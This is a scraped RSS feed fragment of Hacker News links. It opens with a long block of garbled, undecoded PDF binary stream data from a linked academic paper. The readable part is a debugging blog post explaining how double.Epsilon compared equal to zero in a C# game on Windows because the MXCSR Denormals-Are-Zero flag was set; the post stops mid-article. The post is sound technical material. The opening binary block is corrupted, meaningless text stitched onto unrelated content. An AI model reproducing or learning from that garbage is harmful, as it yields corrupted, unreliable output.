‚Ä†√úÀÜ¬æ√Ñ/≈†√ÜB√Ñ√Ü*√ìun√ê√πS\fP¬°G√Ç√ù¬π&lt;#p√ö√ö√û√ôu√≠√õ&gt;Kl√ÉK√£¬øZ√É6GN‚Äì`√ß√°(¬º‚Äπ/8I"¬¥hAz≈∏¬¶¬±√å¬ª ≈°¬™)X¬∏√Ä&gt;√û√ï6'=d√ß√ø]√ågg√Ø√≠‚Äò√Æ√Ö,l√£√Ω¬π√≤¬πf4(≈Ω‚ÄúL!‚Ä∫O8√ô¬¨P√¥ R¬∫√ç¬∑√ò`√±
‚Ä†‚Ä∫r√Üj√¨l‚Äú√ï√Ä√èm\#w√±¬¥√ªdH&nbsp;√´#e¬§∆í¬æs%√ó
√Ö#≈ì[8√°√Ü¬≥¬§√ΩC‚Äû√∫*√¢√´/¬®‚Äπ√º	√ï$¬∏S√π‚Ä¶j‚ÄôQLBj√üT{≈í√Ç¬∞≈æ√§b¬≤√ö?‚Äò]√Ω#=¬°@‚Ä†u¬∞¬¥O))¬• ‚Ä¶_&gt;√çN√ñ≈°¬¶‚Äù;e¬≥`*√î¬ÆRW
‚Ä∫Ad¬ºtcw¬®√ä¬¨S√Ñ√î√â√É√ªT¬∫√§t#S4√®¬¶‚ÄúuO¬ø√©¬¨≈°ar‚Äû√∂√±
wÔøΩ‚Äú√Ω%√¨.\¬ªn¬≠lA!√àE√™Bgck√¢~¬•√ô√™z√Ö[√®@ÔøΩÀÜ√è¬≤j√º√á^i¬™¬ªb‚Ä¶‚Ä∫‚ÄöQSÔøΩ√ôV¬≠+rÔøΩ&amp;X¬™¬®[6(√¥‚Ñ¢√ì √®]P√•M^.√¨‚ÄòS¬¶ÔøΩv¬ßÔøΩ<rh ÔøΩ≈ìx@4√Ñ√®9√æ¬Ω√ï2¬¢r≈∏√ê8_‚Ç¨3√º¬∏pk@√±√´√¢#¬æ√ö√à√í\ahwa√∫9√©‚Äúm¬¥&yzÔøΩv≈∏ma¬°1√§‚Äû‚Ä¶√ç√äym√†="√Ä√£" 4√â√Ü√ö√¶(="" &¬©≈°‚Ä¢√®;e√Æl√ê¬ß}¬±¬≥`|√ù√ä√ò¬æ√±¬≥√õ√è‚Äì="" √§√Ö√∏√Æv`¬º√£p]√∑="" 21n¬§√Ωc|‚Ñ¢√æ‚Ä°√û¬≠b√∫√Ωq√é‚Äú?√∂¬µ:√°¬™="" ¬Æ¬´#¬∫≈Ωo="" b‚Äú‚Ä¶="C√µ√∫√≤L√Ä√†√£,M√™U¬µ_/}√õ√ã¬≥i9`√ΩKu√ß√éÀÜ¬´kl¬∂¬´√úG" √îy√´√è√ò¬∞k√¢g¬∑z‚Äú)_√öÔøΩ√ª¬∑√ö="" √≤√ív√ª√ñ|√Éf√Ö√≠*√®="" ‚Ä†¬≥¬∫√è¬Æ¬∏r√å¬π√∏¬µvdb√ª}jz$l;¬´¬™%h√ò[¬£√Ωx√°gp√≠="" ¬≥√∞b√ø‚Äúo¬∂k‚Ä†‚Äöl√Åg√û1a√ü:_|¬¨}g~\√Äq¬±√ÆÔøΩ√†√ª√™f~p\√∫ym√ßm5√è√Ø‚Ç¨¬∑v≈Ω√Ø√∏-j√ñr¬ø√Ω¬ßu‚Äôo√Å,b2‚Ä†‚Ä∫√ä?‚Äπ¬¶√∂‚Äö‚Ñ¢√±="" ¬©j√©√ì√¢7√±strÔøΩ¬£ÔøΩ}¬´|[√á√à¬´¬´ÔøΩ¬≠√ä="" √û√∑√Öz√≠[a‚Äú¬¢="" 1z√∏}¬´{√Å√æ√≠[{j‚Ä†√≥n∆í‚Äì¬°'√±m√û*k¬¥√¨w‚Äì‚Ä°`√ò∆í}√ç√õ√ôo√≥‚ÄúÔøΩuvb|¬´√É√ø√àa≈ì8ÀÜ∆íÀÜ6√≥8ÔøΩb¬§gÔøΩj√ø√ûeÔøΩ√ü]8s‚Ä¶√∂√ä;√ü≈í√†√†¬∫oq‚Äö&√ø¬∏y#¬¥√µa‚Äö√ä≈æqÔøΩgqa√É‚Ä¶√º√∞="" ≈ì√ÑiÀú√á¬Æ√Ü√ô√ó<c="" +√ü¬πx[√ü√Ø¬ª√≥√•b¬®¬Ø¬∑¬≠¬•r‚Äùa="" √á¬∞√ú9√û0r√∏x¬¥‚Äûi¬¥‚Ä¶vw$¬†√¨ÔøΩh="¬Æ¬¶√î¬®dY‚Ç¨nr√ø√≥ÀÜ√öwy9c‚Ñ¢√¨¬πN7‚Äû≈∏√ï√µ¬∞¬π√ù-¬°≈Ωk√òÔøΩBÀÜ,√≠√¢√∞√≠¬Ω‚Äú¬≥√£¬®J√™&amp;G√â\¬∫#√Æ‚Äìp¬´≈†√Çw‚Äî]√ìq√£≈∏√ç¬™¬™m√ª√á¬∫=√∫q√¥x‚Äò√Ä_ÔøΩ0¬Æ‚Ä∞o√ø√∫lg√∏√≠‚Ä°‚Äîm√∞¬≤√ù√¥V√†" √¶∆í√Ø¬∂¬∞‚Ä¢z√†¬†^√∏√Ø≈∏a√é?="" √Æ√°√≤≈Ω√¶√å¬µ√∏ÀÜ‚Äû'√†2√ê5¬°≈∏√àc‚Äîc√Æf√§√á√ú√Ø√ì¬†-√ûi\√ó√Ç¬•√ø¬ø<w¬†="" endstream="" endobj="" 168="" 0="" obj="" <<="" length="" 3180="" filter="" flatedecode="">&gt;
stream
x√ö√ï√ôn√§√Ü√±]_1‚Ç¨44√ª√¢a ¬ª≈Ω7¬±√ò√éJN¬º√ª@qz4√ÑrH‚Ñ¢‚Ä°v'_≈∏¬∫√à!g¬©¬µ√óAbwuuwuUu]=*√î‚Ä∫√æ‚Äù|‚Äπ√£U¬¥y‚Ç¨√Ü√ü¬Æ^√û]}√±√äD‚Ä∫4√å√¢√òn√Æ√∂‚Ä∫$	¬¥b‚Äú‚Äûq‚Äôm√Æv‚Ä∫≈∏∆í√∏zkT¬¢∆í¬ø√¶u√©+√®X|√¢W/}[w¬Ω/√´√´¬∑w√üN√´~√±Jg¬•√Ç√å9ÔøΩ¬´F‚Ä∫¬≠vai^√ê\o‚Ä¢√í.xk$.(≈°√£c√û‚Äì]Ss√ø√ª&lt;U√û√ª√∫‚Ä†¬ø√ª√º√ö¬®√†	√ø5-∆í¬æ;√ù#uÔøΩo‚Äò‚Ç¨/^¬•‚Ä∫√é¬¢√£qW√öÀú7}Q√©:≈Ω∆í¬≤√û7√≠1√ØK√úO√á	x&nbsp;?‚Äù¬∑:_≈ì‚Ä°aÔøΩ¬æj¬Æ√°√≥~D√µ√ú√ò7‚Ä¢‚Äù√µ∆í¬™¬≤‚ÄìA^√Ü√ö¬≤√Ø}=n¬øX"ÔøΩ√≥√®4h√äB&amp;5{√ßx &lt;√≥‚Äòq@√ú√ì#`√ÄX¬°/‚Äπ%√ù√Ø¬ø¬π¬Ω√ÉV¬¥^√ö≈æ‚Ä°√∫√É¬µ
r√©0¬∑}7y≈æ√î‚Ä¢√øÔøΩ‚Äì
¬∂p√∂√®¬•ÔøΩxh‚Äî√∑9c√ã¬∫p≈ì*K√¨√õ√¶√àÀÜ?‚ÄπD¬°√Ç[√în¬æF‚Ä¢¬∞√âL6√Ü¬®0≈Ω≈í√ë¬π‚Äù¬ª√ê≈∏¬πÔøΩ√ñ%#√™[√¢*a√ÖK√Æ√¨Q+lj‚ÄöemS¬¥√çP√Ø¬∂≈°¬°&nbsp;Q√Ä/¬ø¬Ω√è;√î,√∑u√ë≈æY√ñÀÜ√í
√∑√á¬≤√´&nbsp;√ü√ù0F+√êiI¬æÀÜswh¬Ω√©√≥¬∂c≈í¬º[‚Äú√îb3¬∏,√öe0√ìs∆í9≈†¬≠GR.√¢hB√ï.eÔøΩ√Å√è√†¬ß¬≤6L≈í√Ω]√º¬§¬Ω‚Ä†Nh√ÇX¬∞u√¥}[L√ô‚Ä∫√àEmJ√ì√≤X√à√´√Ö¬¥√¢TT~;1ÔøΩe¬•\¬™L-√Ñ√ã√Ç‚Äö
8mbt¬¨]¬æ(√üD√ä‚Äö^W'(√äG√ò¬∞√∑zA$√íLl√§√†‚Äú√≥¬©9:x¬¨‚Ä†NZ√É}U√õwH)√©√æi!H¬±8S¬®¬¥&amp;31√ú¬≤,V√áP√ø√°¬±√äK¬∏e5-¬¥c‚Äù#~?G≈Ω&amp;S`√ë√ß√ã√±‚Ä†√∑¬∫√µR *
≈°¬∑!7√Ø√à√Ä!¬Ω‚ÄúÔøΩC√∞√ô√û√ä(≈ì
ÔøΩ√íK√ÅÔøΩ√ç√µ
√õ\¬∞¬∞g¬¢≈ì¬≠√ë#Q√Ø√ã√æ√ê(P≈æi¬∫J√Ü%b}`n¬©o¬´‚Äú¬§¬£√âqhr≈ì√Ç√ª√ëwx¬•a≈°¬•3c√ò[‚Äπ√û√ã√ñ¬µ√•!√≤(√≠6$¬æ~}w√µ√ã‚Ä¢b√Ø8¬∫&gt;‚Äπ√Ü¬∞(¬∏√â≈∏√üF‚Ä∫≈íÔøΩN‚Äû@√Ø	√≥¬∏1√ñ‚Ä¶¬©F√éW‚Ä∫√õ¬´^√Å(ÔøΩ&nbsp;d¬•√πZ≈ì¬´√çf√¥¬¶¬∞¬≤V‚Ä∫√°√¥‚Äù‚Ä∞¬æ¬ªF{u_√Ø√Å¬±≈°ÔøΩ4√çZhii√•√µn4y√ÑSÔøΩ√∑u√è√¢$¬¢t(}PYYn√ü&amp;#ÔøΩ¬≠!t.¬≠! √è¬¨!‚Äπ≈∏l!√Ω√Æ√Æ√æ√ò¬±√∑G√á√Ø√§3√≤)@‚Ä∫x√Ø√í6]t√∏√π√í¬±¬∞√°√∏√ßM@_&gt;y¬∏√æ`]%√é√ì‚Ä∞j¬æt2[:g~pg√ß√ë‚Ç¨√îp¬™¬ª≈í√ö¬°‚Äú4E√†N√û√±‚Äî√éq{√±√µ√≠V√©√¥f√ñ√ã¬¥√¥√®#X¬ª;Y√Ä√•4.√â¬¥√Æ¬Ø√í√†!q√¨√ü√ó3‚Äô¬™¬ÆY3G√ò≈ì.√ÖF.‚ÄöK√µNnM√Ñ7‚Äúy√é√Å√Äz√ë-lO√ä@√àg	ÔøΩ¬¢√π√ÉbY√Ö¬∞7√º¬Ω√Ä√î√µ‚Äö^‚Ä∫njW≈∏√∞‚Ä¶|g.‚Äì√Øi√è$?√∏^√ò‚Äö√°3ÔøΩ√ÇÔøΩ¬æ√µ√µC√®¬∏K√™√≥ÔøΩ√ú{¬¶≈Ω.√∑fM{G√õ√å‚Ä°√ºIZ¬¨√ì9S√®tv√¶%√ù≈Ωl*&nbsp;√Å‚Äî¬Ø‚Äò`¬®I1|√®8F√à4¬¢`¬∂√Ωe√à√´~82√∞¬´F&nbsp;¬∑√ø√∫‚ÄòU√ª√ô[√∂√úB√†RÔøΩ~√ó¬™‚Äù¬±≈Ωt3;¬¥√æÔøΩ¬©√õ√±≈æJJla8√º≈æ√é√õ2#K√º≈æ‚Ä∞‚Äö≈æs√®=3√ä√°G‚Ä†j7n¬≥
¬øzÔøΩh7`G√Æ
√àk√êv√Ü≈æ¬•oÔøΩ√ç√á
√ù¬£k@p/≈æ√â%¬∞¬Ω√®¬•√ù√±(\√∂¬π\√û√∂√≤&nbsp;‚Äú¬°
‚Äò√ü√ß‚Ä¶V¬©W56"¬∫≈íU¬∞*F√Ö√å	√¨√è8ÔøΩh∆í¬∞¬±√¶.√ú√∞/¬π5√ä¬Ω?K√Å_√±Ma√©√í‚Äö‚Ä¢re¬µ‚Ñ¢ÔøΩ√ÇÔøΩ√Ø‚Ä°‚Äπ√´"W&lt;‚Äπ√æ≈í√âÔøΩ¬¢√∞&amp;
u√¨√ò√µ)5√≥%6
ÔøΩ≈æ\√ü_√Ñ√è¬ΩÔøΩ
¬≥tr√Ñ¬∞L¬¶1≈í√°‚Ä¢‚Ä∞√∞?2;	/NÔøΩ‚Äπ≈ì √°¬≥¬°√ú¬´.d√Ä√ü√≥'√∞*xÀú^\√ítgBw.√∑√í√éÔøΩ¬∫ÀÜ9√Än&gt;¬©<d¬∂√õa‚Äö√ò√∫√®ÔøΩ8gi.¬¢qr_ÔøΩ"7√ûfy√ü√±4√ê"6k√ò‚Äò√Ä¬§¬º¬¶og~ÔøΩ¬Ω‚Ñ¢√é‚Ç¨ ¬π‚Ä¶%ÀÜm¬¢¬ød‚Ñ¢√ê‚Äìs‚Äî√∞√°¬∞;n¬∂√à√°¬¥¬¶il="" √ß√íÔøΩ¬´‚Ä†#p¬º√ßm√ü¬´m√ä√π¬©m(v¬∑)¬π√ü="">√ë5cH¬µ4"b¬ø‚Ä∞ÔøΩ√è¬•,√ô¬¶K¬¢√Ñ¬•√Å√∞√≠√ú√ö#√´^‚Äò√¨"√∂√¥	√ú√ö√≥√±8M1‚Äò√£(g√â‚Ä†√àÔøΩ√°?¬¥.T e¬Ω+√ë¬°‚Äò¬æB≈∏r1ÔøΩ‚Äö}`√ã‚Ç¨¬´~¬¥"√ò
X√≥√§ÔøΩk¬∞√£o√éX√è√•‚Ä°K-!¬±(<zh√òic¬ß+jx‚Ä∞s‚Ä†√§u^ÔøΩ¬∫ÔøΩ¬¢q`a∆í(d‚Ä†v√ô3 m‚Ä∞‚Äú√≥¬Ω√ß¬©nf√è0√Ç¬π√†‚Äπ‚Äú¬•x‚Äìc_¬´√¨‚Äö√ï‚Äû¬®√Å√ñ¬¨Àú¬†¬∑√ël‚Äî¬Ωh√≤¬®h‚Äπ‚Ç¨o¬¢4@√º¬¶4i√â¬†i√ä√É≈Ωo√ó}√â√ô√åj¬∏="" √∂√ç√é¬¨wf‚Ä∞¬¢¬≤√ê√Ñ≈†‚Ä∞‚Äì%≈∏\`a√æ¬∞5√ï√∫√Ä√Üt¬æ$√èq:%]o"√≠v√¨i&v2¬∏≈°\d‚Äû≈°√¥lpm+‚Äò?‚ÄûÔøΩ¬≤√ô="" √∏¬¨‚Äù¬Ω¬∞√úeg√ã¬≠b¬Ωb≈í‚Äö√¨="" ‚Ä¶+2√õ="" ldej√•ex{f;w.‚Äö9≈í≈∏xfs√ò4e"√ú‚Ä¶d$√º√≠√¢√öbn¬£c6√Æ¬©√ïtÔøΩe√∫√øx`√¶√ó¬¶¬∑√Ä√åm`b¬ß0√ß√∫,√æ}s¬ø&0#)@‚Ä¶i‚Äô‚Äô¬µ¬≥`√µ‚Äì¬©≈†‚Ä∞√ÜtegÔøΩ√õ`¬ªw="" f‚Ç¨@√øÔøΩ2¬¶="" √öÔøΩl√π√á≈ì√øw¬§‚Äû]√§t√•c√ßÔøΩ√£a√Ç≈∏c√†6√π="" ¬øf√Øxu√â‚Äùg‚Äú√ã√æy?m1{‚Äùp4]‚Äò√áeb#√â‚Ä¢qdwj¬£nzn4√Äsc¬±<√¢1¬¨m√ò="" kl‚Ä¶√ô√ël√∑Àúcp√ò√©="" 6√∞¬≥√úpo√öa¬¨√ê‚Äôp‚Äû≈æ‚ÄπsÔøΩdnq√°¬≥w="" #r√Ω$¬°q√¥¬¥¬±√¥r√ætp‚Äúcg@;w‚Ä°‚Ä†√í'√ãa6‚ÄöÔøΩ√á¬°≈æ"z_0¬°√µ√Æ√Äg√ÉvÔøΩ¬π%"¬µÔøΩ‚Ä¢‚Äì5‚Ä†+="">Z√ä¬≠SG√â\≈ìTe√úB√ù&nbsp;ÔøΩc.√Ç:¬ø¬¨(√Ü √ëx¬º√ØN√∑¬æuj√≠vX¬∞√ìUE√Ü¬Ø,‚Ä†≈†q¬™√≤√°√êw√π√Ω√∏P¬≥X√ç9¬∏√π√™l\t?&gt;q0√â‚Ä∞‚Ä∞¬πqO,‚Äû0n,L√û`RN^¬•√¨¬≥√ï√Ü‚Ä¶Y‚Äì.¬•√ã√ì√óÀÜ5¬°=√õ√ï};&lt;√Ü√é¬¨√ë¬™√ÇHgsZ√ì,B¬≤dI∆í√ñY‚ÄúD@√ídp¬≥√Éc¬ß#‚Ä∫√ÜI¬≤f‚ÄúP¬•√≥3¬£Vv√Ü‚Äòm‚Äì¬≤!d¬©F[¬≠t√®√í‚Äπ¬™√Æ¬™6YAk√æ√é¬¥	¬ª`¬π√Å¬∑l]‚Ä∫&nbsp;¬©‚Ä¶6%q¬∫¬ÆMY√≤+√ö‚Äù‚Ä¶:≈°√ò√æ≈ì"√às‚Äú√¥EBjU‚Äù¬¶√ú¬∫√î$¬¨~√å5)
√àr1f¬≤¬™4√ÄIw¬°c¬¨&lt;¬©[‚Äú¬§√ÉB¬≤ÔøΩ√ì¬ßTj√ô√∞6g√≠‚Äò‚Äô√ñ≈†√∂‚Ç¨√∑:_&gt;√ëeq¬™√ï≈°√∂√Ñ¬°¬≥√±bOm¬¢‚Ä¢=√ázT≈°A≈°~‚Äò¬ß√èm	i*Dc∆í¬≥‚Äì+√∏¬¢9√ΩP∆í√ë√ß¬∫¬¶≈í‚Ä¢5y√ü√ã√¨¬•-6l√¥M‚Äù{√ø≈æ√ª√ã"!√ài`∆í√≤‚Äû√≤	G4w√á[te√∏√¢#I√ø√ëcÔøΩ'd√†√§hc‚Ä¶%FH√ñ¬®√Ü#√®√ö√º√Ås¬´T√Ñ√∑¬§9ÔøΩ _+√§¬ª.√∂_3√†j¬∞‚Äö
√´bZ√ßU≈∏¬±Oi|√∑yQVX√≥√úJ√©WÔøΩ¬¢‚Ñ¢√ç8¬¢¬ª:¬ßq)¬™¬¶¬£√∫u√é√µM√ûqv¬¢ÔøΩQ^¬´√≤¬Ω√∞√ã¬§yK‚Äúd"√∏Su‚Ä∫G¬∏¬≤‚Ä°C¬Ω√†J¬æL¬∞√£P¬æd0‚Ä¢W√Ü¬µ)≈ì√â%ÔøΩ√à√ê9¬ø@RW√§‚Ä¢√Ä√â√≠!¬®¬§¬£‚ÄîRHz√∂4|¬¢‚Ñ¢√™√Ø.x‚Ä¶ÔøΩ¬°√Ö√§uL‚Ç¨ox‚Äû¬§&lt;√™¬π√çAÔøΩV¬≠√èw'√Æt(¬§ÔøΩ√å[√Ü‚Äûq√º)e√Å7√äX)1√ú∆í¬©y√≤√≠¬ª¬≤¬™√æ√Ñ√ù√èyW√óiÀú√®√â√Ç8√ª√õ√É√π‚Äπga¬±√£‚Äö√æ√Ωx¬Ω√∞yM¬≤√â@6¬Æc[t";?¬µ`ÔøΩF‚Äò√î√±‚Äò~‚Ä¢0√æ√Æ√ü√àq√º)d√ë√¥√î‚ÄòK√ù‚Ä°¬™√∞√Ä ¬æ*N‚Ä†b‚Äπ√ß
√Å¬•gCjQ√ß√í√ô√´v√º‚Ä°ÔøΩ√î
√∑~¬∫√•√Øc≈ΩqZ√áÔøΩ,√ä,ÀúG√ÆpXÔøΩPm√£8q√ú√Å0¬ß{`o√Ü¬§√≥√∑√á5¬≠√§√∏U√Ö√Åm&gt;¬¢√ù0`zF√•:?√Ø0√æ¬ø¬ø{√ΩS√à√ç‚Äî#√íxI¬±}ÔøΩ¬ß
?√é√è√ª√ã:√§|√πn√úx¬ΩD=‚Ä∞√îj‚Ä°OZM√µD√ûz¬ª¬°e√ä¬¥&lt;82_i√∞‚Ä∫ÔøΩVÔøΩ\‚Ç¨√è√±√∏√•l√´i√£‚Äπ&lt;-	√èhf¬°√ª8¬¥√ºmz¬ø√ñN≈ΩÔøΩ{√ê&amp;√Å#28_¬ø_√ü]√Ω¬™*∆í≈°
endstream
endobj
176 0 obj
&lt;&lt;</zh√∏ic¬ß+jx‚Ä∞s‚Ä†√§u^ÔøΩ¬∫ÔøΩ¬¢q`a∆í(d‚Ä†v√π3></d¬∂√ªa‚Äö√∏√∫√®ÔøΩ8gi.¬¢qr_ÔøΩ"7√æfy√ü√±4√∞"6k√∏‚Äò√†¬§¬º¬¶og~ÔøΩ¬Ω‚Ñ¢√Æ‚Ç¨></rh></e√≥@nz¬Ωf≈æ√ø¬µu√Ω√≤!√ü`¬°"bte√¶\l[√ª√≤≈æ<¬∏ÔøΩ1`√∑{¬ßo¬µÔøΩ‚Äû√´√¨Àú√™√°√ó√∑yq|√°√£‚Äî$√™‚Ä∞vq‚Äùv^?t√Ω¬´3¬π√†√¥ÔøΩÔøΩ√´¬Ø?√≤√∫¬®></f^ÔøΩ√Ω√∞w≈ì√æ√¥></w¬ºvn¬≤ÔøΩ‚Äî√¶√ØÔøΩ√£¬¨5√º¬∫$></hp‚Ç¨√£≈æ√µ√©mp√±x;¬∑h.¬±√´></qv√±√º2‚Ä∫7¬∑<></m¬•¬∑w√™‚Ç¨¬°ÔøΩ?@d√§√ª¬ª0√¥√¨pwj@‚Ñ¢‚Ç¨4></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/papers/categories-20200918.pdf">https://cr.yp.to/papers/categories-20200918.pdf</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/papers/categories-20200918.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520781</guid>
            <pubDate>Fri, 18 Sep 2020 19:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When double.Epsilon can equal 0]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520728">thread link</a>) | @maple3142
<br/>
September 18, 2020 | https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html | <a href="https://web.archive.org/web/*/https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" aria-label="Content">
  <div>
    <article>
      <div>
        <p>Most of the time debugging isn‚Äôt really much to write about, especially in C# land.
In a language executing on a VM, with a managed memory model, most bugs are relatively shallow and easy to fix, except for the occasional race if you‚Äôre doing multi-threading - so when suddenly it appears that comparison of doubles has stopped working correctly, all bets are off.</p>

<p>About the only options available at that point that don‚Äôt result in loss of sanity are:</p>

<ol>
  <li>give up investigating and accept that computers are fickle, unknowable machines, uncontrollable by your puny meat-based mind,</li>
  <li>spend a week of evenings looking at why the program you‚Äôre looking at apparently entirely fails at arithmetic.</li>
</ol>

<p>From the fact that this post exists, you‚Äôve probably guessed that I went for #2.</p>



<p>It all started with <a href="https://github.com/ppy/osu/issues/9952">yet another GitHub issue</a>, in which a user reported a crash after clicking around in the <a href="https://github.com/ppy/osu">osu!lazer</a> beatmap editor.
(I won‚Äôt go into the particular details of what a beatmap editor is, as it‚Äôs mostly unimportant to the larger topic of this post.)</p>

<p>As is usual operating procedure, I, along with others, went to try to reproduce the problem on my Ubuntu install, and failed; it looked like it was going to be yet another irreproducible, and therefore inactionable, crash report.</p>

<p>The first ‚Äúhail mary‚Äù came from the reporter themselves - they managed to ascertain that the crash only happened when the game was ran in single-threaded mode, and in a joint effort we‚Äôve also managed to ascertain that it was also Windows-specific.
This already bore the signs that it was going to be an <em>interesting</em> one to deal with - especially given where the crash was located at‚Ä¶</p>

<p>Without going through too much unnecessary detail, the bespoke framework that osu!lazer uses has the concept of <em>bindables</em>.
A bindable is a wrapper around a value; a bindable can be, as the name suggests, <em>bound</em> to another bindable, and therefore bidirectionally receive and send value updates to and from the other bindable.
This allows showing one particular value in multiple places on the UI, and ensuring that if one instance changes, the others will follow suit.</p>

<p>For numerical bindables, backed by floating-point values, the bindables have a built-in notion of precision, to prevent changes on the order of 1e-10 firing all sorts of callbacks when they don‚Äôt really matter.
Here‚Äôs the implementation of the <code>Precision</code> property:</p>

<div><div><pre><code><span>public</span> <span>T</span> <span>Precision</span>
<span>{</span>
    <span>get</span> <span>=&gt;</span> <span>precision</span><span>;</span>
    <span>set</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>precision</span><span>.</span><span>Equals</span><span>(</span><span>value</span><span>))</span>
            <span>return</span><span>;</span>

        <span>if</span> <span>(</span><span>value</span><span>.</span><span>CompareTo</span><span>(</span><span>default</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
            <span>throw</span> <span>new</span> <span>ArgumentOutOfRangeException</span><span>(</span><span>nameof</span><span>(</span><span>Precision</span><span>),</span> <span>value</span><span>,</span> <span>"Must be greater than 0."</span><span>);</span>

        <span>SetPrecision</span><span>(</span><span>value</span><span>,</span> <span>true</span><span>,</span> <span>this</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>For some reason, on Windows, in single-threaded mode, setting <code>Precision</code> to <code>double.Epsilon</code> caused the <code>ArgumentOutOfRangeException</code> to be thrown, even though <code>double.Epsilon</code> is <em>definitively</em> larger than zero.
Debugger or no debugger, you could <em>see</em> <code>value</code> having <code>5e-324</code> in a watch and <code>default</code> being <code>0</code>, and then the branch with the throw would be taken <em>anyway</em>, almost as if the fabric of reality was slipping from right under your feet.</p>

<p>It was clearly time to leave my beloved Rider, open up the rusty (but trusty) Visual Studio and get out the disassembly window.
After having enabled native debugging in the project settings and stepping into <code>double.CompareTo()</code>, I saw the following assembly code:</p>

<div><div><pre><code>--- /_/src/System.Private.CoreLib/shared/System/Double.cs ----------------------
            if (m_value &lt; value) return -1;
00007FFA1F5307E0  sub         rsp,18h
00007FFA1F5307E4  vzeroupper
00007FFA1F5307E7  vmovsd      xmm0,qword ptr [rcx]
00007FFA1F5307EB  vucomisd    xmm1,xmm0         ; compare xmm1 to xmm0
00007FFA1F5307EF  ja          00007FFA1F53084D  ; jump if above (CF = 0, ZF = 0)
            if (m_value &gt; value) return 1;
00007FFA1F5307F1  vucomisd    xmm0,xmm1
00007FFA1F5307F5  ja          00007FFA1F53085E
            if (m_value == value) return 0;
00007FFA1F5307F7  vucomisd    xmm0,xmm1
00007FFA1F5307FB  jp          00007FFA1F5307FF  ; jump if parity (PF = 0)
00007FFA1F5307FD  je          00007FFA1F530857  ; jump if equal (ZF = 0)
</code></pre></div></div>

<p>And, sure enough, I could definitely see that the execution of these instructions differed beteween multi-threaded and single-threaded mode.
Using the ‚ÄúRegisters‚Äù window I dumped the register state in both cases and got the following result (click screenshot below to enlarge):</p>

<p><a href="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" target="_blank"><img src="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" alt=""></a></p>

<p><code>xmm0</code> and <code>xmm1</code> clearly have sane and expected values in both cases, so it definitely wasn‚Äôt a mis-store.
It was the comparison <em>itself</em> that was somehow wrong - but why?</p>

<p>I quickly (and, in retrospect, stupidly) went to confirm that the issue was CPU vendor-agnostic, and got the confirmation that it happens on both Intel and AMD CPUs.
About the only meaningful discrepancy seemed to be the mystery <code>MXCSR</code> value, so it was time to investigate.</p>



<p>Before having departed on this journey, I have never really cared to look up anything about SSE/AVX registers.
Any readers that possess such knowledge have already spotted the problem in the screenshot above, but for those that presumably have never looked into anything of the sort, this section aims to be a brief recap.</p>

<p>The <code>vucomisd</code> instruction is a - watch out - <em>vectorised unordered compare of scalar double-precision floating point values</em> that happens to return its result in <code>EFLAGS</code>.
Let‚Äôs break this down further into constituent parts:</p>

<ul>
  <li>The <em>vectorised</em> part means SIMD (<em>single instruction, multiple data</em>).
SIMD instructions allow <em>data parallelisation</em> - on a concrete example, you can execute one common instruction simultaneously on <code>N</code> different values at a time.
Thankfully in this case that part isn‚Äôt really all that relevant.</li>
  <li>The <em>unordered</em> part relates to <code>NaN</code>s.
In IEEE 754 floating-point math, <code>NaN</code>s are special (and annoying) values that fail every comparison they‚Äôre part of (so a <code>NaN</code> is neither less, greater than or equal to any other number, including another <code>NaN</code>).</li>
  <li><em>Compare of scalar double-precision floating point values</em> sounds about right for what we wanted in the C# code to begin with.</li>
</ul>

<p>The result is returned in <code>EFLAGS</code>, which is a special quasi-register that is better viewed as a set of flags.
Here is the table describing the possible results of a <code>vucomisd</code> instruction:</p>

<table>
  <thead>
    <tr>
      <th>result</th>
      <th>zero flag (ZF)</th>
      <th>parity flag (PF)</th>
      <th>carry flag (CF)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>unordered (one of operands is a <code>NaN</code>)</td>
      <td>1</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>greater than</td>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>less than</td>
      <td>0</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>equal</td>
      <td>1</td>
      <td>0</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>Now, the <code>MXCSR</code> register is a special <em>control register</em>, in that it <em>controls</em> how the other SSE/AVX instructions execute.
In this particular case we‚Äôre interested in two related flags, one of which will turn out to be causing the madness.</p>

<ul>
  <li>Bit 15 of the register is <em>Flush To Zero (FTZ)</em>. Setting that bit will cause <em>writes</em> of denormal floating-point values to be coerced to zero.</li>
  <li>Bit 6 of the register is <em>Denormals Are Zero (DAZ)</em>. Setting that bit will cause <em>reads</em> of denormal floating-point values to be coerced to zero.</li>
</ul>

<p>This is immediately eye-catching in this particular scenario, as coercion to zero would definitively explain the differing equality result.
However, to confirm, let‚Äôs define what a <em>denormal value</em> is (because I didn‚Äôt know either).</p>

<p>A denormal value is a floating-point value that has leading zeroes in the significand (so it‚Äôs of the form 0.00‚Ä¶1‚Ä¶).
This can only happen if the exponent of the value is all zeroes - in that case, the implicit leading 1, normally assumed for any other exponent, is swapped for a zero.
Therefore, the largest denormal double-precision value is</p>

<div><div><pre><code>0b0 0000000000 1111111111111111111111111111111111111111111111111111 = 2.225073858507201e-308
  ¬± |exponent| |--------------mantissa/significand----------------|
</code></pre></div></div>

<p>Because <code>double.Epsilon</code> is essentially a <code>(uint64_t)0x1</code>, it definitely <em>is</em> a denormal number.
And, sure enough, as the screenshot above demonstrates, DAZ is <em>set</em> in the single-threaded case, in which the issue reproduces.</p>

